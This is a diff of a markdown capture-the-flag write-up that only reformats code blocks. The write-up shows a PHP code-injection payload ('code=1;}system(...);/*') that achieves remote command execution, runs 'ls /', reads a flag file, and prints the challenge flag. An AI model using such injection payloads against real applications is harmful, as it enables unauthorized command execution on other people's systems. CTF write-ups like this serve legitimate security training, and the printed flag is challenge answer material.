@@ -31,13 +31,19 @@ https://www.codetd.com/en/article/7175910
 
 So using this payload we can get RCE 
 
-``` code=1;}system(%27ls%20/%27);/* ``` 
+```php 
+code=1;}system(%27ls%20/%27);/* 
+``` 
 
 ![image](https://user-images.githubusercontent.com/58823465/166170373-0d777a68-fe58-4e97-bd07-55605fd3d9ae.png)
 
 
 Next we just need to find the flag in the nibbles directory
 
-````code=1;}system(%27cat%20./nibbles/flag.txt%27);/*````
+````php
+code=1;}system(%27cat%20./nibbles/flag.txt%27);/*
+````
 
-``` Flag : DOCTF{G3TT1NG_RC3_(S0RRY_..._N1BBL3S)_1$_4LW4Y$_GR34T}  ```
+``` 
+Flag : DOCTF{G3TT1NG_RC3_(S0RRY_..._N1BBL3S)_1$_4LW4Y$_GR34T}  
+```
